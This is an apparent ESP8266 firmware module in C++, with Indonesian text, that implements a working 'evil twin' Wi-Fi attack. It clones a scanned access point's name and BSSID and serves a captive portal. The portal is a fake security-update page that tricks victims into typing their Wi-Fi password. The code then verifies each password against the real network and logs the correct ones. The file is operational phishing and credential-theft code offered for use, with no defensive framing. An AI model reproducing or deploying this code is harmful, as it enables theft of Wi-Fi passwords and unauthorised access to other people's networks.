#include "evil.h"
#include "sniffer.h"
#include "cli.h"
#include "beacon.h"
#include "deauth.h"
#include "pdeauth.h"
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <string.h>

extern "C" {
  #include "user_interface.h"
}

#define EV_MAX_AP 24

struct scan_entry { uint8_t bssid[6]; uint8_t channel; int8_t rssi; char ssid[33]; };
static scan_entry s_scan[EV_MAX_AP];
static uint8_t    s_scanN = 0;

static ESP8266WebServer s_web(80);
static DNSServer        s_dns;

enum { EV_OFF, EV_PORTAL, EV_VERIFYING };
static uint8_t  s_state = EV_OFF;
enum { V_NONE, V_WRONG, V_OK };
static uint8_t  s_verdict = V_NONE;

static char     s_ssid[33] = {0};
static uint8_t  s_bssid[6];
static uint8_t  s_ch = 1;
static char     s_pwd[65] = {0};
static uint32_t s_verifyStart = 0;
static uint32_t s_lastStat = 0;
static bool     s_handlersSet = false;

// ----------------------------------------------------------- halaman -------
static String pagePortal(bool err) {
  String h = F("<!DOCTYPE html><html><head><meta charset=utf-8>"
               "<meta name=viewport content='width=device-width,initial-scale=1'>"
               "<title>Konfigurasi Jaringan</title><style>"
               "body{font-family:system-ui,Arial,sans-serif;background:#0b1f33;margin:0;color:#222}"
               ".c{max-width:380px;margin:8vh auto;background:#fff;border-radius:14px;padding:26px 22px;"
               "box-shadow:0 10px 40px rgba(0,0,0,.3)}"
               ".lg{font-size:13px;letter-spacing:1px;color:#0a66c2;font-weight:700;text-transform:uppercase}"
               "h2{margin:6px 0 2px;font-size:20px}p{color:#555;font-size:14px;line-height:1.5}"
               "input{width:100%;box-sizing:border-box;padding:13px;margin:10px 0;border:1px solid #ccc;"
               "border-radius:8px;font-size:15px}button{width:100%;padding:13px;background:#0a66c2;color:#fff;"
               "border:0;border-radius:8px;font-size:16px;font-weight:600}"
               ".er{background:#fde8e8;color:#b71c1c;padding:10px;border-radius:8px;font-size:13px;margin:8px 0}"
               ".f{color:#999;font-size:11px;text-align:center;margin-top:14px}"
               "</style></head><body><div class=c><div class=lg>Pembaruan Keamanan</div><h2>");
  h += s_ssid;
  h += F("</h2><p>Router Anda memerlukan verifikasi. Untuk melanjutkan koneksi internet, "
         "masukkan kembali kata sandi WiFi Anda.</p>");
  if (err) h += F("<div class=er>Kata sandi salah. Silakan coba lagi.</div>");
  h += F("<form method=POST action=/connect>"
         "<input type=password name=pwd placeholder='Kata sandi WiFi' required autofocus>"
         "<button>Sambungkan</button></form>"
         "<div class=f>Verifikasi keamanan jaringan</div></div></body></html>");
  return h;
}

static String pageChecking() {
  return F("<!DOCTYPE html><html><head><meta charset=utf-8>"
           "<meta name=viewport content='width=device-width,initial-scale=1'>"
           "<meta http-equiv=refresh content='3;url=/result'><title>Memverifikasi</title>"
           "<style>body{font-family:system-ui,Arial;background:#0b1f33;color:#fff;text-align:center;padding:18vh 20px}"
           "</style></head><body><h3>Memverifikasi koneksi...</h3>"
           "<p>Mohon tunggu sebentar.</p></body></html>");
}

static String pageSuccess() {
  return F("<!DOCTYPE html><html><head><meta charset=utf-8>"
           "<meta name=viewport content='width=device-width,initial-scale=1'><title>Tersambung</title>"
           "<style>body{font-family:system-ui,Arial;background:#0b1f33;color:#fff;text-align:center;padding:18vh 20px}"
           "</style></head><body><h3>&#10003; Berhasil tersambung</h3>"
           "<p>Terima kasih. Koneksi Anda telah dipulihkan.</p></body></html>");
}

// ----------------------------------------------------------- handlers ------
static void handleRoot()  { s_web.send(200, "text/html", pagePortal(s_verdict == V_WRONG)); }

static void handleConnect() {
  String pwd = s_web.arg("pwd");
  strncpy(s_pwd, pwd.c_str(), 64); s_pwd[64] = 0;
  IPAddress ip = s_web.client().remoteIP();
  Serial.printf("\n[evil] >>> PASSWORD DICOBA: \"%s\"  (dari %s)\n", s_pwd, ip.toString().c_str());

  // mulai verifikasi ke AP asli (STA), non-blocking
  WiFi.begin(s_ssid, s_pwd);
  s_state   = EV_VERIFYING;
  s_verdict = V_NONE;
  s_verifyStart = millis();
  s_web.send(200, "text/html", pageChecking());
}

static void handleResult() {
  if (s_state == EV_VERIFYING)      s_web.send(200, "text/html", pageChecking());
  else if (s_verdict == V_OK)       s_web.send(200, "text/html", pageSuccess());
  else                              s_web.send(200, "text/html", pagePortal(s_verdict == V_WRONG));
}

// ----------------------------------------------------------- lifecycle -----
void evil_stop() {
  if (s_state == EV_OFF) return;
  s_web.stop();
  s_dns.stop();
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true);
  WiFi.mode(WIFI_STA);
  s_state = EV_OFF;
  Serial.println(F("[evil] STOP — evil twin dimatikan"));
}

static void evil_start(int idx) {
  memcpy(s_bssid, s_scan[idx].bssid, 6);
  s_ch = s_scan[idx].channel;
  strncpy(s_ssid, s_scan[idx].ssid, sizeof(s_ssid)); s_ssid[sizeof(s_ssid) - 1] = 0;
  s_pwd[0] = 0; s_verdict = V_NONE;

  // bersihkan mode lain
  if (sniffer_running()) sniffer_stop();
  beacon_stop(); deauth_stop(); pdeauth_stop();

  WiFi.mode(WIFI_AP_STA);
  wifi_set_macaddr(SOFTAP_IF, s_bssid);          // clone BSSID (best-effort)
  bool ok = WiFi.softAP(s_ssid, (const char*)NULL, s_ch);  // open, channel sama

  IPAddress apip = WiFi.softAPIP();
  s_dns.setErrorReplyCode(DNSReplyCode::NoError);
  s_dns.start(53, "*", apip);                    // catch-all -> captive portal

  if (!s_handlersSet) {
    s_web.on("/", handleRoot);
    s_web.on("/connect", HTTP_POST, handleConnect);
    s_web.on("/result", handleResult);
    s_web.onNotFound(handleRoot);                // trigger popup captive portal
    s_handlersSet = true;
  }
  s_web.begin();

  s_state = EV_PORTAL;
  s_lastStat = millis();
  Serial.printf("[evil] AKTIF — twin '%s' ch%d, BSSID %s%s\n",
                s_ssid, s_ch, nc_mac_str(s_bssid), ok ? "" : " (softAP gagal?)");
  Serial.printf("       portal di http://%s/  — tunggu korban masuk. 'evil stop' utk berhenti\n",
                apip.toString().c_str());
}

void evil_loop() {
  if (s_state == EV_OFF) return;
  s_dns.processNextRequest();
  s_web.handleClient();

  if (s_state == EV_VERIFYING) {
    if (WiFi.status() == WL_CONNECTED) {
      s_verdict = V_OK; s_state = EV_PORTAL;
      Serial.printf("\n[evil] ====================================\n");
      Serial.printf("[evil]  PASSWORD BENAR: \"%s\"\n", s_pwd);
      Serial.printf("[evil]  SSID: %s\n", s_ssid);
      Serial.printf("[evil] ====================================\n");
      WiFi.disconnect(false);                    // lepas STA, AP tetap hidup
    } else if (millis() - s_verifyStart > 10000) {
      s_verdict = V_WRONG; s_state = EV_PORTAL;
      Serial.printf("[evil] password SALAH: \"%s\" — portal minta ulang\n", s_pwd);
      WiFi.disconnect(false);
    }
  }

  if (millis() - s_lastStat >= 5000) {
    s_lastStat = millis();
    Serial.printf("[evil] '%s' ch%d | client tersambung: %d%s\n",
      s_ssid, s_ch, WiFi.softAPgetStationNum(),
      s_verdict == V_OK ? " | PASSWORD TERTANGKAP" : "");
  }
}

// -------------------------------------------------- pilih AP (capture) -----
static void on_select(const char* line) {
  if (line[0] == 'q' || line[0] == 'Q' || line[0] == '\0') {
    Serial.println(F("[evil] dibatalkan")); cli_release(); return;
  }
  int idx = atoi(line);
  if (idx < 0 || idx >= (int)s_scanN) {
    Serial.printf("nomor tidak valid (0-%u). coba lagi atau 'q'\n", s_scanN ? s_scanN - 1 : 0);
    return;
  }
  evil_start(idx);
  cli_release();
}

static void cmd_evil(int argc, char** argv) {
  if (argc >= 2 && strcasecmp(argv[1], "stop") == 0) { evil_stop(); return; }

  beacon_stop(); deauth_stop(); pdeauth_stop();
  if (sniffer_running()) sniffer_stop();
  Serial.println(F("[evil] memindai AP..."));
  int n = WiFi.scanNetworks(false, true);
  s_scanN = 0;
  for (int i = 0; i < n && s_scanN < EV_MAX_AP; i++) {
    memcpy(s_scan[s_scanN].bssid, WiFi.BSSID(i), 6);
    s_scan[s_scanN].channel = (uint8_t)WiFi.channel(i);
    s_scan[s_scanN].rssi    = (int8_t)WiFi.RSSI(i);
    strncpy(s_scan[s_scanN].ssid, WiFi.SSID(i).c_str(), 32);
    s_scan[s_scanN].ssid[32] = 0;
    s_scanN++;
  }
  WiFi.scanDelete();
  if (s_scanN == 0) { Serial.println(F("[evil] tidak ada AP")); return; }

  Serial.println(F("=== pilih AP untuk EVIL TWIN ==="));
  for (uint8_t i = 0; i < s_scanN; i++)
    Serial.printf("  %u) ch%-2d %4ddBm  %s  %s\n",
      i, s_scan[i].channel, s_scan[i].rssi, nc_mac_str(s_scan[i].bssid),
      s_scan[i].ssid[0] ? s_scan[i].ssid : "<hidden>");
  Serial.println(F("ketik nomor AP (atau 'q' batal):"));
  cli_capture(on_select, "evil AP#> ");
}

void evil_init() {
  cli_register("evil", "evil twin + captive portal (evil | evil stop)", cmd_evil);
}
